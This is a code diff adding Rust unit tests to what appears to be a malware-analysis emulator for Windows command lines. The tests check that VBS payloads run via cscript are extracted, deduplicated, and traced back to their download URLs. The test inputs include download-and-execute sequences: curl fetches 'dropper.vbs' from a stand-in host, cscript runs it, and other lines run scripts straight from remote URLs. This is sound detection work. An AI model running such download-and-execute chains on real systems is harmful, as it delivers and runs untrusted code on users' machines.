@@ -17531,6 +17531,25 @@ mod cscript_tests {
     }
 
     #[test]
+    fn cscript_basename_vbs_content_extracts_full_path_payload() {
+        let mut env = Environment::new(&Config::default());
+        let vbs_content = b"WScript.Echo \"full path\"\r\n".to_vec();
+        env.modified_filesystem.insert(
+            r#"c:\temp\dropper.vbs"#.to_string(),
+            FsEntry::Content {
+                content: vbs_content.clone(),
+                append: false,
+            },
+        );
+        interpret_line("cscript //nologo dropper.vbs", &mut env);
+        assert!(
+            env.exec_vbs.iter().any(|c| c == &vbs_content),
+            "basename VBS content was not extracted from full-path tracked file: {:?}",
+            env.exec_vbs
+        );
+    }
+
+    #[test]
     fn wscript_with_js_content_extracts_payload() {
         let mut env = Environment::new(&Config::default());
         let js_content = b"WScript.Echo('hi')\r\n".to_vec();
@@ -17614,6 +17633,32 @@ wscript .\payload.js"#,
     }
 
     #[test]
+    fn cscript_repeated_vbs_content_is_queued_once() {
+        let mut env = Environment::new(&Config::default());
+        let vbs_content = b"WScript.Echo \"dedupe\"\r\n".to_vec();
+        env.modified_filesystem.insert(
+            "dropper.vbs".to_string(),
+            FsEntry::Content {
+                content: vbs_content.clone(),
+                append: false,
+            },
+        );
+
+        interpret_line("cscript //nologo dropper.vbs", &mut env);
+        interpret_line("cscript //nologo dropper.vbs", &mut env);
+
+        assert_eq!(
+            env.all_extracted_vbs
+                .iter()
+                .filter(|content| *content == &vbs_content)
+                .count(),
+            1,
+            "duplicate VBS payload queued: {:?}",
+            env.all_extracted_vbs
+        );
+    }
+
+    #[test]
     fn script_hosts_emit_url_argument_and_lolbas_for_remote_scripts() {
         let cscript_raw = r#"cscript //nologo "https://script-host.example/dropper.vbs""#;
         let wscript_raw = r#"wscript "script-host-schemeless.example/dropper.js""#;
@@ -17688,6 +17733,28 @@ wscript .\payload.js"#,
                 env.traits
             );
         }
+    }
+
+    #[test]
+    fn cscript_basename_resolves_full_path_download_source_url() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"curl -o C:\Temp\dropper.vbs https://script-host-basename.example/dropper.vbs"#,
+            &mut env,
+        );
+        interpret_line("cscript //nologo dropper.vbs", &mut env);
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::UrlArgument { cmd, url }
+                        if cmd == "cscript //nologo dropper.vbs"
+                            && url == "https://script-host-basename.example/dropper.vbs"
+                )
+            }),
+            "cscript basename did not resolve full-path download source: {:?}",
+            env.traits
+        );
     }
 
     #[test]
